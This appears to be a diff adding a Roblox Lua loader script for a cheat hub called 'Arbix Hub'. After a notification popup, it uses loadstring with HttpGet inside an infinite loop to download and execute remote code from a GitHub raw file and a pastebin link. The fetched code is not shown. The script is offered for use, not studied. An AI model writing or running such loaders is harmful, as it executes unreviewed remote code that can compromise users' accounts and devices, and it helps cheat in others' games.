@@ -1,0 +1,14 @@
+game:GetService("StarterGui"):SetCore("SendNotification",{
+Title = "Script loaded enjoy!",
+Text = "Script is beta wait for updates in Arbix Hub server !", 
+
+Button1 = "Yes",
+Button2 = "Cancel",
+Duration = 30 
+})
+while true do
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Youifpg/CR7/refs/heads/main/CR7.lua"))()
+
+loadstring(game:HttpGet("https://pastebin.com/raw/84rU4mHU"))()
+wait()
+end
